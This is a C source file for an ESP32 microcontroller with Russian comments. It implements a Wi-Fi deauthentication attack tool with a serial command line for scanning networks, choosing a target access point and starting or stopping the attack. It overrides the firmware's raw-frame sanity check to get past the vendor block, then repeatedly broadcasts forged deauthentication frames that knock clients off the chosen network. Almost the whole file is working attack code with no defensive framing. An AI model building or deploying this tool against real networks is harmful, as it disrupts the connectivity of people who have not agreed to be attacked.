#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "driver/uart.h"
#include "esp_vfs_dev.h"

static const char *TAG = "DEAUTH";

// Переопределяем функцию проверки кадров (обход блокировки)
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;  // Всегда разрешаем
}

// Структура для хранения информации о точке доступа
typedef struct {
    uint8_t bssid[6];
    int8_t rssi;
    uint8_t channel;
    char ssid[33];
} wifi_ap_record_t;

#define MAX_AP 20
static wifi_ap_record_t ap_list[MAX_AP];
static uint16_t ap_count = 0;
static uint8_t target_bssid[6] = {0};
static uint8_t target_channel = 0;
static bool attack_running = false;

// Очередь для команд (не обязательно, но удобно)
static QueueHandle_t cmd_queue;

// Функция сканирования
static void scan_networks(void) {
    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true
    };
    ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, true));
    uint16_t number = MAX_AP;
    wifi_ap_record_t records[MAX_AP];
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&number, records));
    ap_count = number;
    memcpy(ap_list, records, number * sizeof(wifi_ap_record_t));

    printf("\n--- Доступные сети ---\n");
    for (int i = 0; i < ap_count; i++) {
        printf("%2d: %-32s  BSSID: %02x:%02x:%02x:%02x:%02x:%02x  Ch: %2d  RSSI: %d\n",
               i+1,
               ap_list[i].ssid,
               ap_list[i].bssid[0], ap_list[i].bssid[1], ap_list[i].bssid[2],
               ap_list[i].bssid[3], ap_list[i].bssid[4], ap_list[i].bssid[5],
               ap_list[i].channel,
               ap_list[i].rssi);
    }
    printf("------------------------\n");
}

// Задача обработки команд
static void cli_task(void *arg) {
    char line[128];
    while (1) {
        // Чтение строки из UART
        int len = 0;
        while (1) {
            char c;
            int res = fread(&c, 1, 1, stdin);
            if (res <= 0) {
                vTaskDelay(pdMS_TO_TICKS(10));
                continue;
            }
            if (c == '\n' || c == '\r') {
                line[len] = '\0';
                break;
            } else if (c == '\b' && len > 0) {
                len--;
                printf("\b \b");
            } else if (len < sizeof(line)-1) {
                line[len++] = c;
                putchar(c);
            }
        }
        printf("\n");

        // Разбор команды
        if (strcmp(line, "scan") == 0) {
            scan_networks();
        }
        else if (strncmp(line, "set ", 4) == 0) {
            int idx = atoi(line + 4) - 1;
            if (idx >= 0 && idx < ap_count) {
                memcpy(target_bssid, ap_list[idx].bssid, 6);
                target_channel = ap_list[idx].channel;
                printf("Target set to: %s\n", ap_list[idx].ssid);
                printf("BSSID: %02x:%02x:%02x:%02x:%02x:%02x, Channel: %d\n",
                       target_bssid[0], target_bssid[1], target_bssid[2],
                       target_bssid[3], target_bssid[4], target_bssid[5], target_channel);
            } else {
                printf("Invalid number\n");
            }
        }
        else if (strcmp(line, "start") == 0) {
            if (target_channel != 0) {
                attack_running = true;
                printf("Attack STARTED\n");
            } else {
                printf("No target selected. Use 'set <num>' first.\n");
            }
        }
        else if (strcmp(line, "stop") == 0) {
            attack_running = false;
            printf("Attack STOPPED\n");
        }
        else if (strcmp(line, "help") == 0) {
            printf("Commands:\n");
            printf("  scan          - scan for Wi-Fi networks\n");
            printf("  set <num>     - set target by number from scan\n");
            printf("  start         - start deauth attack\n");
            printf("  stop          - stop attack\n");
        }
        else {
            printf("Unknown command. Type 'help'.\n");
        }
    }
}

// Задача отправки деаутентификации
static void deauth_task(void *arg) {
    uint8_t deauth_packet[26] = {
        0xC0, 0x00, 0x00, 0x00,          // Frame Control: Deauth
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (будет заменено)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (будет заменено)
        0x00, 0x00,                         // Sequence
        0x01, 0x00                           // Reason code
    };

    while (1) {
        if (attack_running && target_channel != 0) {
            // Переключаем канал
            esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
            // Заполняем адреса
            memcpy(&deauth_packet[10], target_bssid, 6);
            memcpy(&deauth_packet[16], target_bssid, 6);
            // Отправляем пакет
            esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        }
        vTaskDelay(pdMS_TO_TICKS(100));  // 10 пакетов в секунду
    }
}

void app_main(void) {
    // Инициализация NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    // Инициализация UART для консоли
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    esp_vfs_dev_uart_use_driver(CONFIG_ESP_CONSOLE_UART_NUM);

    // Инициализация WiFi в режиме STA
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_LOGI(TAG, "Ready. Type 'help' for commands.");

    // Создаем задачи
    xTaskCreate(cli_task, "cli", 4096, NULL, 5, NULL);
    xTaskCreate(deauth_task, "deauth", 4096, NULL, 5, NULL);
}
